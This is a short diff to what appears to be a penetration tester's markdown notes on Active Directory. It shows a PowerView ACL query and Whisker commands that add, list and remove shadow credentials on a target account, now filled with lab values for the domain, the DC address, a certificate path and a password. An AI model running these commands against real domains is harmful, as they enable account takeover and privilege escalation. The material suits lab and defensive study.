@@ -17,10 +17,11 @@ Get-DomainObjectAcl | Where-Object {
 Get-DomainObjectAcl  | Where-Object { $_.ObjectAceType -eq "5b47d60f-6051-40fb-99e0-ed3a78604e5d" }
 ```
 
-# Whisker
+# Whisker.exe
 ```powershell
-.\Whisker.exe add /target:TargetObject /domain:lab.local /dc:dc01.lab.local
-.\Whisker.exe list /target:TargetObject
+Whisker.exe list /target:VictimUser /domain:warzone.oxsium.local /dc:192.168.0.199
+
+Whisker.exe add /target:VictimUser /domain:warzone.oxsium.local /dc:192.168.0.199 /path:C:\Tools\victimuser.pfx /password:Oxsium123!
 
 .\Whisker.exe remove /target:TargetObject /deviceid:<DeviceID_from_add_command>
 ```
